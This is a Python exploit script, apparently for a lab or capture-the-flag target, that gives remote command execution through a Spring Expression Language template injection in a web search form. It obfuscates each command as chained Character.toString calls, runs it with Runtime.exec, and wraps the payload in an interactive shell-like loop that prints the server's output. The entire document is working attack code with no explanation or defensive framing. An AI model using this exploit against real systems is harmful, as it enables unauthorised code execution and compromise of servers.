import requests

def req(payload):
	burp0_url = "http://10.129.34.130:8080/search"
	burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://10.129.34.130:8080", "Connection": "close", "Referer": "http://10.129.34.130:8080/search", "Upgrade-Insecure-Requests": "1"}
	burp0_data = {"name": payload}
	return requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

def create(command):
	decimals=[]
	for i in command:
		decimals.append(str(ord(i)))
	payload='''*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
	
	for i in decimals[1:]:
		line='.concat(T(java.lang.Character).toString({}))'.format(i)
		payload+=line
	payload+=').getInputStream())}'
	return payload

while True:
	cmd = input("> ")
	response = req(create(cmd)).text
	try:
		response = response.split('You searched for: ')[1].split("</h2>")[0].strip()
		print(response)
	except:
		print(response)